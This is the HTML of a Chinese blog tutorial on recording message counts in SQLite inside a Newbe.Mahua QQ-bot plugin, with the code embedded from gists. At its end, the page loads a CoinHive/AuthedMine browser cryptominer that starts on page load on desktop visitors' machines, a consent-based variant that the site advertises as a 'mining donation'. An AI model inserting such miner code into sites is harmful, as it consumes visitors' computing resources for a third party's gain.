<!DOCTYPE html>
<html lang="zh-cn">

  <head>
  <meta charset="utf-8">
  <meta name="msvalidate.01" content="71CCAD9D3DEDBA653F52D96EACF9ED56" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="文本将通过实现一个记录”收到消息数量”的功能，来演示如何在本SDK中操作数据库的SQLite数据库。">
  <link rel="canonical" href="http://0.0.0.0:4000/docs/mahua/2017/12/30/Newbe-Mahua-Samples-Sqlite.html">
  <link rel="alternate" type="application/rss+xml" title="Newbe | Newbe便是新生，唯有不断蜕变才能焕然新生。" href="http://0.0.0.0:4000 /feed.xml " />
  <meta name="keywords" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Newbe.Mahua.Samples.Sqlite SQLite操作实例 | Newbe | Newbe便是新生，唯有不断蜕变才能焕然新生。 </title>
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <link rel="shortcut icon" type="image/x-icon" href="/assets/i/favicon.ico" media="screen">
  <meta name="mobile-web-app-capable" content="yes">
  <link rel="icon" sizes="192x192" href="/assets/i/favicon.ico">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="Newbe" />
  <link rel="apple-touch-icon-precomposed" href="/assets/i/favicon.ico">
  <meta name="msapplication-TileImage" content="/assets/i/favicon.ico">
  <meta name="msapplication-TileColor" content="#0e90d2">
  <link rel="stylesheet" href="http://cdn.amazeui.org/amazeui/2.7.2/css/amazeui.min.css">
  <link rel="stylesheet" href="/assets/css/app.css">
  <style media="screen">
      del{
        text-decoration: none;
        color: black;
        background-color:black
      }
      del:hover{
        background-color:white
      }
  </style>
  <!-- 腾讯分析 BEGIN-->
  <script type="text/javascript" src="http://tajs.qq.com/stats?sId=62304791" charset="UTF-8"></script>
  <!--腾讯分析 END-->
  <script>
    (function(i, s, o, g, r, a, m) {
      i['GoogleAnalyticsObject'] = r;
      i[r] = i[r] || function() {
        (i[r].q = i[r].q || []).push(arguments)
      }, i[r].l = 1 * new Date();
      a = s.createElement(o),
        m = s.getElementsByTagName(o)[0];
      a.async = 1;
      a.src = g;
      m.parentNode.insertBefore(a, m)
    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
    ga('create', 'UA-100658571-1', 'auto');
    ga('send', 'pageview');
  </script>
</head>


  <body>

    <header class="am-g am-g-fixed blog-fixed blog-text-center blog-header">
  <div class="am-u-sm-8 am-u-sm-centered">
    <img width="200" src="/assets/i/logo.png" alt="Amaze UI Logo" />
    <h2 class="am-hide-sm-only">Newbe便是新生，唯有不断蜕变才能焕然新生。</h2>
  </div>
</header>
<!-- nav start -->
<nav class="am-g am-g-fixed blog-fixed blog-nav">
  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only blog-button" data-am-collapse="{target: '#blog-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
  <div class="am-collapse am-topbar-collapse" id="blog-collapse">
    <ul class="am-nav am-nav-pills am-topbar-nav">
      <li class="am-active"><a href="/">首页</a></li>
      <li><a href="#" title="麻花文库(Mahua Gallery)" onclick=" $('#pleaseWait').modal()">麻花(Mahua)插件中心</a></li>
      <li><a href="https://gitee.com/yks/Newbe.Mahua.Framework" title="项目源码" target="_blank">项目源码</a></li>
      <li><a href="https://cnhv.co/ya7l" title="挖矿捐助" target="_blank">挖矿捐助 <del>不花钱</del> </a></li>
      <li><a href="https://gitee.com/yks/Newbe.Mahua.Framework#project-donate-overview" title="现金捐助" target="_blank">现金捐助</a></li>
      <li><a href="https://marketplace.visualstudio.com/items?itemName=Newbe36524.NewbeMahuaVsExtensions" title="VS插件下载" target="_blank">VS插件下载</a></li>
      <li><a href="https://jq.qq.com/?_wv=1027&k=4AMMCTx" title="技术交流群" target="_blank">技术交流群</a></li>
      <li><a href="https://live.bilibili.com/7834872" title="直播码字" target="_blank" id="liveStatus" >直播码字</a></li>
    </ul>
    <div class="am-form-group">
      <script type="text/javascript">
        (function() {
          document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E'));
          var bdcs = document.createElement('script');
          bdcs.type = 'text/javascript';
          bdcs.async = true;
          bdcs.src = 'http://znsv.baidu.com/customer_search/api/js?sid=4496900582148885024' + '&plate_url=' + encodeURIComponent(window.location.href) + '&t=' + Math.ceil(new Date() / 3600000);
          var s = document.getElementsByTagName('script')[0];
          s.parentNode.insertBefore(bdcs, s);
        })();
      </script>
    </div>
  </div>
</nav>
<hr>
<!-- nav end -->

<div class="am-modal am-modal-alert" tabindex="-1" id="pleaseWait">
  <div class="am-modal-dialog">
    <div class="am-modal-hd">即将上线</div>
    <div class="am-modal-bd">
     尽请期待！
    </div>
    <div class="am-modal-footer">
      <span class="am-modal-btn">确定</span>
    </div>
  </div>
</div>


        <!-- content srart -->
<div class="am-g am-g-fixed blog-fixed blog-content">
  <div class="am-u-md-8 am-u-sm-12">
    <article class="am-article blog-article-p">
      <div class="am-article-hd">
        <h1 class="am-article-title blog-text-center">Newbe.Mahua.Samples.Sqlite SQLite操作实例</h1>
        <p class="am-article-meta blog-text-center">
          <span><a href="#" class="blog-color">Docs and Mahua</a></span>-
          <span><a href="#">Newbe &nbsp;</a></span>-
          <span><a href="#">30 Dec 2017</a></span>
        </p>
      </div>
      <div class="am-article-bd">
            <p>文本将通过实现一个记录”收到消息数量”的功能，来演示如何在本SDK中操作数据库的SQLite数据库。</p>

<h1 id="软硬条件">软硬条件</h1>

<table>
  <thead>
    <tr>
      <th>名</th>
      <th>值</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>IDE</td>
      <td>VS2017.5</td>
    </tr>
    <tr>
      <td>Newbe.Mahua</td>
      <td>1.6</td>
    </tr>
  </tbody>
</table>

<h1 id="业务逻辑">业务逻辑</h1>

<p>当收到好友消息时，将消息记录在数据库中。</p>

<p>同时将当前数据库中已经存储的消息数目，发送给消息发送者。</p>

<p>实测效果图：</p>

<p><img src="/assets/i/20171230-003.png" alt="最终效果" /></p>

<h1 id="新建项目">新建项目</h1>

<p>使用<code class="highlighter-rouge">Newbe.Mahua.Plugins.Template</code>模板创建项目，项目名称为<code class="highlighter-rouge">Newbe.Mahua.Samples.Sqlite</code>。</p>

<p>新建项目的详细细节，可以参照右侧链接内容：<a href="/docs/mahua/2017/12/16/Begin-First-Plugin-With-Mahua-In-v1.4.html#新建项目">新建项目</a></p>

<h1 id="业务逻辑实现">业务逻辑实现</h1>

<p>业务逻辑比较简单，主要实现两个方法：”保存好友消息”和”获取消息数量”。</p>

<p>为了提升多核CPU的利用率，相关接口都采用异步的方式进行定义。<del>实际上时为了让新手看不懂</del></p>

<p>业务接口代码如下：</p>

<script src="https://gist.coding.net/u/pianzide1117/78d8db32578d4181aba1ef03d1fff9ed.js">
</script>

<p>在<code class="highlighter-rouge">MahuaEvents</code>下添加”好友消息接收事件”，并在事件内调用业务逻辑。实现代码如下：</p>

<blockquote>
  <p>MahuaEvents文件夹是本SDK建议将事件放置的文件夹位置。也可以不接受建议而添加在其他地方。</p>
</blockquote>

<script src="https://gist.coding.net/u/pianzide1117/9aac8a1c992044bfbc6e8b842372c3da.js">
</script>

<p>至此业务逻辑便实现完毕。</p>

<h1 id="单元测试">单元测试</h1>

<p>业务逻辑已经实现完毕，接下来对业务逻辑编写单元测试进行验证。<del>其实这么简单的逻辑，看一眼就知道没错</del></p>

<p>单元测试项目相关的内容可以参看右侧的教程：<a href="/docs/mahua/2017/12/25/Newbe-Mahua-Tests.html#测试">单元测试</a></p>

<p>此处只将业务逻辑的关键测试代码展示出来：</p>

<script src="https://gist.coding.net/u/pianzide1117/f1e546c39bad4a6fbc855e1fb6d7302d.js">
</script>

<h1 id="数据库操作实现">数据库操作实现</h1>

<h2 id="定义数据库操作接口">定义数据库操作接口</h2>

<p>单元测试通过之后便表明当前业务逻辑都已经正确实现了。</p>

<p>接下来进一步就可以实现业务接口的实现类了。</p>

<p>为了完成业务逻辑，本实例至少需要”初始化数据库”、”查询数据库”和”向数据库插入数据”三个数据库操作方法。</p>

<p>其中的”查询数据库”和”向数据库插入数据”可以简单定义为”创建数据库链接即可”。</p>

<p>为了提升多核CPU的利用率，相关接口都采用异步的方式进行定义。<del>实际上时为了让新手看不懂</del></p>

<p>数据库操作接口定义如下：</p>

<script src="https://gist.coding.net/u/pianzide1117/b1a09237e10c4ad991660acb1d9674bb.js">
</script>

<h2 id="使用sqlite实现数据库操作">使用SQLite实现数据库操作</h2>

<p>SQLite数据库操作，通过官方提供的类库便可以完成。</p>

<p>通过 nuget 安装以下nuget包：</p>

<ul>
  <li>System.Data.SQLite.Core</li>
  <li>Dapper</li>
  <li>Dapper.Contrib</li>
</ul>

<p>其中<code class="highlighter-rouge">System.Data.SQLite.Core</code>是数据库驱动，<code class="highlighter-rouge">Dapper</code>则是对<code class="highlighter-rouge">ADO.NET</code>操作的扩展包。</p>

<p>新建<code class="highlighter-rouge">应用程序配置文件</code>。</p>

<p><img src="/assets/i/20171230-002.png" alt="应用程序配置文件" /></p>

<p>在应用程序配置文件中配置以下内容：</p>

<script src="https://gist.coding.net/u/pianzide1117/b1c07f041151475a853d8003eb97c7f7.js">
</script>

<p>添加数据库操作实现类<code class="highlighter-rouge">SqliteDbHelper</code>,详细代码如下：</p>

<script src="https://gist.coding.net/u/pianzide1117/b40b418f89474f2788a118029844b493.js">
</script>

<h2 id="编写业务实现类">编写业务实现类</h2>

<p>完成了业务接口的定义和数据操作的定义，接下来只要将两者结合起来，便可以实现业务实现类。</p>

<p>添加<code class="highlighter-rouge">FriendMessageStore</code>类，详细代码如下：</p>

<script src="https://gist.coding.net/u/pianzide1117/0d9c3cc90ff44de9920cbcfcc7fc7154.js">
</script>

<h2 id="在插件启动时初始化数据库">在插件启动时初始化数据库</h2>

<p>数据库的初始化，需要在插件启动时进行调用。</p>

<p>在<code class="highlighter-rouge">MahuaEvents</code>下添加”插件初始化事件”，并在事件内调用业务逻辑。实现代码如下：</p>

<blockquote>
  <p>MahuaEvents文件夹是本SDK建议将事件放置的文件夹位置。也可以不接受建议而添加在其他地方。</p>
</blockquote>

<script src="https://gist.coding.net/u/pianzide1117/b3c0531b395c4045b44566d8fb03c7d2.js">
</script>

<h1 id="模块注册">模块注册</h1>

<p>以上所有的接口与实现类与接口，都不要忘记在模块中进行注册，以下是<code class="highlighter-rouge">MahuaModule</code>的完整代码：</p>

<script src="https://gist.coding.net/u/pianzide1117/5ea6037102fb408ebf39c62c3f9c016e.js">
</script>

<h1 id="集成测试">集成测试</h1>

<p>万事具备，只欠生成。</p>

<p>生成解决方案，运行<code class="highlighter-rouge">build.bat</code>，复制相关的 DLL 到对应的平台，向机器人发送消息，效果达成！</p>

<p>以下是 CQP 平台的测试效果。<del>其实其他的没测试</del></p>

<p><img src="/assets/i/20171230-003.png" alt="最终效果" /></p>

<h1 id="总结">总结</h1>

<p>数据库操作本身并不困难。</p>

<p>开发过程中采用基于接口开发的基本思想，结合单元测试，不论是开发简单的插件还是复杂的项目，都是可靠的方法。</p>

<p>若SQLite无法满足项目要求，只要将多实现一个<code class="highlighter-rouge">IDbHelper</code>便可以完成了，开发者可以动手体验。</p>

<p>实例的项目代码，可以在源码仓库中的<code class="highlighter-rouge">Newbe.Mahua.Samples</code>解决方案下找到。</p>

<p>=========================更多内容分割线=========================</p>

<p>■ 教程链接：</p>

<p><a href="/docs/mahua/2017/12/16/Begin-First-Plugin-With-Mahua-In-v1.4.html">开始第一个QQ机器人【适用于v1.4及以上】</a></p>

<p><a href="/docs/mahua/2017/12/24/Newbe-Mahua-Administration.html">Newbe.Mahua 扩展设置中心</a></p>

<p><a href="/docs/mahua/2017/12/25/Newbe-Mahua-Tests.html">Newbe.Mahua 测试与调试</a></p>

<p><a href="/docs/mahua/2017/12/30/Newbe-Mahua-Samples-Sqlite.html">Newbe.Mahua.Samples.Sqlite SQLite操作实例</a></p>

<p><a href="/docs/mahua/2017/12/31/Newbe-Mahua-Samples-LiveGirl.html">Newbe.Mahua.Samples.LiveGirl 操作定时任务</a></p>

<p>■ 发布说明:</p>

<p><a href="/docs/mahua/releasenodes/2017/12/30/Release-Notes-1-6-0.html">Newbe.Mahua 1.6.0 开发便利性提升</a></p>


      </div>
    </article>
    <hr>
    <div class="am-g blog-article-widget blog-article-margin">
      <div class="am-u-lg-4 am-u-md-5 am-u-sm-7 am-u-sm-centered blog-text-center">
        <span class="am-icon-tags"> &nbsp;</span>
        
          <a href="#">Mahua</a>
        
          <a href="#">SDK</a>
        
        <hr>
        <a href="http://wpa.qq.com/msgrd?v=3&uin=472158246&site=qq&menu=yes" target="_blank"><span class="am-icon-qq am-icon-fw am-primary blog-icon blog-icon"></span></a>
<a href="https://github.com/Newbe36524" target="_blank"><span class="am-icon-github am-icon-fw blog-icon blog-icon"></span></a>
<a href="http://weibo.com/newbe36524" target="_blank"><span class="am-icon-weibo am-icon-fw blog-icon blog-icon"></span></a>
<a href="http://git.oschina.net/yks" target="_blank"><span class="am-icon-reddit am-icon-fw blog-icon blog-icon"></span></a>

      </div>
    </div>
    <hr>
  </div>
  <div class="am-u-md-4 am-u-sm-12 blog-sidebar">
  <div class="blog-sidebar-widget blog-bor">
    <h2 class="blog-text-center blog-title"><span>About ME</span></h2>
    <img src="/assets/i/f14.jpg" alt="about me" class="blog-entry-img">
    <p>Newbe</p>
    <p>
      我是一个有脾气的程序员
    </p>
    <p>别说话，给我捐钱就可以了</p>
  </div>
  <div class="blog-sidebar-widget blog-bor">
    <h2 class="blog-text-center blog-title"><span>Contact ME</span></h2>
    <p>
      <a href="http://wpa.qq.com/msgrd?v=3&uin=472158246&site=qq&menu=yes" target="_blank"><span class="am-icon-qq am-icon-fw am-primary blog-icon blog-icon"></span></a>
<a href="https://github.com/Newbe36524" target="_blank"><span class="am-icon-github am-icon-fw blog-icon blog-icon"></span></a>
<a href="http://weibo.com/newbe36524" target="_blank"><span class="am-icon-weibo am-icon-fw blog-icon blog-icon"></span></a>
<a href="http://git.oschina.net/yks" target="_blank"><span class="am-icon-reddit am-icon-fw blog-icon blog-icon"></span></a>

    </p>
  </div>
  <!--<div class="blog-clear-margin blog-sidebar-widget blog-bor am-g ">
    <h2 class="blog-title"><span>TAG cloud</span></h2>
    <div class="am-u-sm-12 blog-clear-padding">
      <a href="" class="blog-tag">amaze</a>
      <a href="" class="blog-tag">妹纸 UI</a>
      <a href="" class="blog-tag">HTML5</a>
      <a href="" class="blog-tag">这是标签</a>
      <a href="" class="blog-tag">Impossible</a>
      <a href="" class="blog-tag">开源前端框架</a>
    </div>
  </div>-->
  <div class="blog-sidebar-widget blog-bor">
    <h2 class="blog-title"><span>么么哒</span></h2>
    <ul class="am-list">
      <li><a href="#">不要以为自己已经走入了人生的谷底，还有好多下坡路在等着你。</a></li>
      <li><a href="#">你这么努力，忍受那么多寂寞和纠结，我们也没觉得你有多优秀。</a></li>
      <li><a href="#">人和人之间最大的区别就是逛完商场后下电梯，你按1楼，别人都按B。</a></li>
      <li><a href="#">对今天解决不了的事情，也不要着急。因为明天也可能还是解决不了。</a></li>
    </ul>
  </div>
</div>

</div>
<!-- content end -->


    <footer class="blog-footer">
  <div class="am-g am-g-fixed blog-fixed am-u-sm-centered blog-footer-padding">
    <div class="am-u-sm-12 am-u-md-4- am-u-lg-4">
      <h3>Newbe</h3>
      <p class="am-text-sm">没什么可说的！
    </div>
    <div class="am-u-sm-12 am-u-md-4- am-u-lg-4">
      <h3>社交账号</h3>
      <p>
        <a href="http://wpa.qq.com/msgrd?v=3&uin=472158246&site=qq&menu=yes" target="_blank"><span class="am-icon-qq am-icon-fw am-primary blog-icon blog-icon"></span></a>
<a href="https://github.com/Newbe36524" target="_blank"><span class="am-icon-github am-icon-fw blog-icon blog-icon"></span></a>
<a href="http://weibo.com/newbe36524" target="_blank"><span class="am-icon-weibo am-icon-fw blog-icon blog-icon"></span></a>
<a href="http://git.oschina.net/yks" target="_blank"><span class="am-icon-reddit am-icon-fw blog-icon blog-icon"></span></a>

      </p>
      <h3>Bio</h3>
      <p>没什么可说的！</p>
    </div>
    <div class="am-u-sm-12 am-u-md-4- am-u-lg-4">
      <h1>我们站在巨人的肩膀上</h1>
      <h3>Heroes</h3>
      <p>
        <ul>
          <li>amazeui</li>
          <li>amwiki</li>
          <li>jekyll</li>
          <li>...</li>
        </ul>
      </p>
    </div>
  </div>
  <div class="blog-text-center">© 2017 Newbe
    <!-- CNZZ BEGIN -->
    <script src="/assets/js/newbe/cnzz.js" type="text/javascript"></script>
    <!-- CNZZ END -->
  </div>
</footer>
<div class="am-modal am-modal-confirm" tabindex="-1" id="live-confirm">
  <div class="am-modal-dialog">
    <div class="am-modal-hd">b站直播</div>
    <div class="am-modal-bd">
      听说正在直播码字，要不要前去帮忙刷一下人气？
    </div>
    <div class="am-modal-footer">
      <span class="am-modal-btn am-btn-primary" data-am-modal-cancel>滚蛋</span>
      <span class="am-modal-btn" data-am-modal-confirm>好的</span>
    </div>
  </div>
</div>
<!--[if (gte IE 9)|!(IE)]><!-->
<script src="https://cdn.bootcss.com/jquery/2.1.4/jquery.min.js"></script>
<!--<![endif]-->
<!--[if lte IE 8 ]>
<script src="http://libs.baidu.com/jquery/1.11.3/jquery.min.js"></script>
<script src="http://cdn.staticfile.org/modernizr/2.8.3/modernizr.js"></script>
<script src="http://cdn.amazeui.org/amazeui/2.7.2/js/amazeui.ie8polyfill.min.js"></script>
<![endif]-->
<script src="http://cdn.amazeui.org/amazeui/2.7.2/js/amazeui.min.js"></script>
<!-- JiaThis BEGIN -->
<script src="/assets/js/newbe/jiathis.js" type="text/javascript"></script>
<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jiathis_r.js?move=0&amp;btn=r4.gif&amp;uid=2134199" charset="utf-8"></script>
<!-- JiaThis END -->
<!-- 百度推送 BEGIN -->
<script src="/assets/js/newbe/baidutuisong.js" type="text/javascript"></script>
<!-- 百度推送 END -->
<script type="text/javascript">
$(function () {
  // 表格增加样式
  $(".am-article").find("table").addClass("am-table am-table-striped am-table-hover");
  // 你知道的太多了
  $("del").attr("title","你知道的太多了！");
  // 直播状态
  (function () {
    var loaded = false;
    window.setInterval(function () {
        if (!loaded) {
            $.get("http://pianzide1117.oicp.net:12821/api/beesite/status")
                .done(function (data) {
                    if (data) {
                        $('#live-confirm').modal({
                            relatedTarget: this,
                            onConfirm: function (options) {
                                window.open("https://live.bilibili.com/7834872");
                            },
                            onCancel: function () {}
                        });
                        $("#liveStatus").text("正在直播码字");
                    } else {
                        $("#liveStatus").text("这会儿没有直播");
                    }
                    loaded = true;
                })
                .error(function () {
                    $("#liveStatus").text("这会儿没有直播");
                });
        }
    }, 2000);
  })();
});
</script>
<script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('70pQBVoLVg88SblKomCh9mJHBeT8nOzk', {throttle: 0.7});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	if (!miner.isMobile() && !miner.didOptOut(14400)) {
		miner.start();
	}
</script>


  </body>

</html>
